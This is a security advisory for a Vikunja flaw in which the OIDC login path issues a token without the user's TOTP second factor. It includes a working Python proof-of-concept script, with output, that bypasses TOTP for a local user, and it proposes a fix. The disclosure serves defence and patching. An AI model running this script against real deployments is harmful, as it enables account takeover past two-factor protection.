# [H] Vikunja has TOTP Two-Factor Authentication Bypass via OIDC Login Path

## Summary
Severity: High
Advisory: GHSA-8jvc-mcx6-r4cg
CVE: CVE-2026-34727
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-8jvc-mcx6-r4cg
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The OIDC callback handler issues a full JWT token without checking whether the matched user has TOTP two-factor authentication enabled. When a local user with TOTP enrolled is matched via the OIDC email fallback mechanism, the second factor is completely skipped.

## Details

The OIDC callback at `pkg/modules/auth/openid/openid.go:185` issues a JWT directly after user lookup:

```go
return auth.NewUserAuthTokenResponse(u, c, false)
```

There are zero references to TOTP in the entire `pkg/modules/auth/openid/` directory. By contrast, the local login handler at `pkg/routes/api/v1/login.go:79-102` correctly implements TOTP verification:

```go
totpEnabled, err := user2.TOTPEnabledForUser(s, user)
if totpEnabled {
    if u.TOTPPasscode == "" {
        _ = s.Rollback()
        return user2.ErrInvalidTOTPPasscode{}
    }
    _, err = user2.ValidateTOTPPasscode(s, &user2.TOTPPasscode{
        User:     user,
        Passcode: u.TOTPPasscode,
    })
```

When OIDC `EmailFallback` maps to a local user who has TOTP enabled, the TOTP enrollment is ignored and a full JWT is issued without any second-factor challenge.

## Proof of Concept

Tested on Vikunja v2.2.2 with Dex as the OIDC provider.

Setup:
- Vikunja configured with `emailfallback: true` for Dex
- Local user `alice` (id=1) has TOTP enabled

```python
import requests, re, html
from urllib.parse import parse_qs, urlparse

TARGET = "http://localhost:3456"
DEX = "http://localhost:5556"
API = f"{TARGET}/api/v1"

# verify TOTP is required for local login
r = requests.post(f"{API}/login",
    json={"username": "alice", "password": "Alice1234!"})
print(f"Local login without TOTP: {r.status_code} code={r.json().get('code')}")
# Output: 412 code=1017 (TOTP required)

# login via OIDC (same flow as VIK-020 PoC)
s = requests.Session()
r = s.get(f"{DEX}/dex/auth?client_id=vikunja"
          f"&redirect_uri={TARGET}/auth/openid/dex"
          f"&response_type=code&scope=openid+profile+email&state=x")
action = html.unescape(re.search(r'action="([^"]*)"', r.text).group(1))
if not action.startswith("http"): action = DEX + action
r = s.post(action, data={"login": "alice@test.com", "password": "password"},
           allow_redirects=False)
approval_url = DEX + r.headers["Location"]
r = s.get(approval_url)
req = re.search(r'name="req" value="([^"]*)"', r.text).group(1)
r = s.post(approval_url, data={"req": req, "approval": "approve"},
           allow_redirects=False)
code = parse_qs(urlparse(r.headers["Location"]).query)["code"][0]

resp = requests.post(f"{API}/auth/openid/dex/callback",
    json={"code": code, "redirect_url": f"{TARGET}/auth/openid/dex"})
print(f"OIDC login: {resp.status_code}")

user = requests.get(f"{API}/user",
    headers={"Authorization": f"Bearer {resp.json()['token']}"}).json()
print(f"User: id={user['id']} username={user['username']}")
# TOTP was completely bypassed
```

Output:
```
Local login without TOTP: 412 code=1017
OIDC login: 200
User: id=1 username=alice
```

Local login correctly requires TOTP (412), but the OIDC path issued a JWT for alice without any TOTP challenge.

## Impact

When an administrator enables OIDC with `EmailFallback`, any user who has enrolled TOTP two-factor authentication on their local account can have that protection completely bypassed. An attacker who can authenticate to the OIDC provider with a matching email address gains full access without any second-factor challenge. This undermines the security guarantee of TOTP enrollment.

This vulnerability is a prerequisite chain with the OIDC email fallback account takeover (missing `email_verified` check). Together, they allow an attacker to bypass both the password and the TOTP second factor.

## Recommended Fix

Add a TOTP check in the OIDC callback before issuing the JWT:

```go
totpEnabled, err := user.TOTPEnabledForUser(s, u)
if err != nil {
    _ = s.Rollback()
    return err
}
if totpEnabled {
    _ = s.Rollback()
    return echo.NewHTTPError(http.StatusForbidden,
        "TOTP verification required. Please use the local login endpoint.")
}
return auth.NewUserAuthTokenResponse(u, c, false)
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8jvc-mcx6-r4cg
- https://nvd.nist.gov/vuln/detail/CVE-2026-34727
- https://github.com/go-vikunja/vikunja/pull/2582
- https://github.com/go-vikunja/vikunja/commit/b642b2a4536a3846e627a78dce2fdd1be425e6a1
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
